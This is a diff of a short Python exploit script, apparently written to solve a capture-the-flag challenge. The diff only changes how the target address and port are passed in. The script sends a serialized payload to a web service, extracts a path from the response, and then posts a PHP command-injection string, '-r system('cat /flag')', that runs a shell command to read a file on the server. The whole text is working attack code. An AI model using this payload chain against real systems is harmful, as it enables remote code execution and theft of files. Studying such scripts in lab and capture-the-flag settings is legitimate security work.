@@ -4,7 +4,7 @@ import sys
 import subprocess
 import re
 
-IP = sys.argv[1]
+IPPORT = sys.argv[1]
 PORT = 3322
 
 def get_ser_payload():
@@ -17,9 +17,9 @@ def payload_gen():
     data['access'] = pld
     return json.dumps(data)
 
-r = requests.get('http://{}:{}/'.format(IP,PORT), params={'payload': payload_gen()}, allow_redirects=False)
+r = requests.get('http://{}/'.format(IPPORT), params={'payload': payload_gen()}, allow_redirects=False)
 
 match = re.findall(r"\/(.*)\"", r.text)[0]
 
-r = requests.post('http://{}:{}/{}run'.format(IP,PORT,match), data={'script': '-r system(\'cat /flag\'); //.php', 'param': ''})
+r = requests.post('http://{}/{}run'.format(IPPORT,match), data={'script': '-r system(\'cat /flag\'); //.php', 'param': ''})
 print(r.text)
